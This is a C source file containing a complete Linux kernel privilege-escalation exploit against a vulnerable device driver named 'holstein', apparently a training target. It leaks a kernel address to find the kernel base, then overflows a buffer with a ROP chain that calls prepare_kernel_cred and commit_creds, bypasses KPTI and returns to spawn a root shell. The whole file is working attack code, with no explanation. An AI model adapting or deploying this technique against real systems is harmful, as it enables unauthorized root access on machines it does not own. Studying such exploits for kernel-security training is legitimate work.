#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#define USER_LOG 1
int global_fd;
#define size 500
#define VULN_DEVICE_NAME "holstein"
#define VULN_BUFFER_SIZE 0x400
unsigned long user_cs, user_ss, user_sp, user_rflags;
#define KERNEL_BASE 0xffffffff81000000
#define POP_RDI_OFFSET (0xffffffff8127bbdc - KERNEL_BASE)
#define POP_RDI (kernel_base + POP_RDI_OFFSET)
#define PREPARE_KERNEL_CRED_OFFSET (0xffffffff8106e240 - KERNEL_BASE)
#define PREPARE_KERNEL_CRED (kernel_base + PREPARE_KERNEL_CRED_OFFSET)
#define XOR_RCX_RCX_OFFSET (0xffffffff810abef0 - KERNEL_BASE)
#define XOR_RCX_RCX (kernel_base + XOR_RCX_RCX_OFFSET)
#define MOV_RDI_RAX_REP_OFFSET (0xffffffff8160c96b - KERNEL_BASE)
#define MOV_RDI_RAX_REP (kernel_base + MOV_RDI_RAX_REP_OFFSET)
#define COMMIT_CREDS_OFFSET (0xffffffff8106e390 - KERNEL_BASE)
#define COMMIT_CREDS (kernel_base + COMMIT_CREDS_OFFSET)
#define BYPASS_KPTI_OFFSET (0xffffffff81800e26 - KERNEL_BASE)
#define BYPASS_KPTI (kernel_base + BYPASS_KPTI_OFFSET)
void open_kn() {
  global_fd = open("/dev/holstein", O_RDWR);
  if (global_fd < 0) {
    exit(-1);
  }
}
uint64_t kernel_base;
static void save_state() {
  asm("movq %%cs, %0\n"
      "movq %%ss, %1\n"
      "movq %%rsp, %2\n"
      "pushfq\n"
      "popq %3\n"
      : "=r"(user_cs), "=r"(user_ss), "=r"(user_sp), "=r"(user_rflags)
      :
      : "memory");
}

static void get_shell() {
  char *argv[] = {"/bin/sh", NULL};
  char *envp[] = {NULL};
  puts("[+] Get Root!");
  execve("/bin/sh", argv, envp);
}
static void read_data() {
  int base = 128;
  uint64_t buf[size];
  uint64_t data = read(global_fd, buf, sizeof(buf));
  kernel_base = buf[129] - 0x13d33c;

  printf("[+] kbase: 0x%lx\n", kernel_base);
}

static void write_kn() {
  uint64_t buf[size];
  memset(buf, 'a', 128);
  uint64_t *rop = (uint64_t *)&buf[128];
  *rop++ = 0xdeadbeefcafebabe;
  *rop++ = (uint64_t)(POP_RDI);
  *rop++ = 0;
  *rop++ = (uint64_t)(PREPARE_KERNEL_CRED);
  *rop++ = (uint64_t)(XOR_RCX_RCX);
  *rop++ = (uint64_t)(MOV_RDI_RAX_REP);
  *rop++ = (uint64_t)(COMMIT_CREDS);
  *rop++ = (uint64_t)(BYPASS_KPTI);
  *rop++ = 0xdeadbeefcafebe00;
  *rop++ = 0xdeadbeefcafebe01;
  *rop++ = (uint64_t)(get_shell);
  *rop++ = (uint64_t)(user_cs);
  *rop++ = (uint64_t)(user_rflags);
  *rop++ = (uint64_t)(user_sp);
  *rop++ = (uint64_t)(user_ss);
  write(global_fd, buf, (uint64_t)rop - (uint64_t)buf);
}

int main() {
  char buf[2 * VULN_BUFFER_SIZE] = {0};
  open_kn();
  save_state();
  read_data();
  write_kn();

  return 0;
}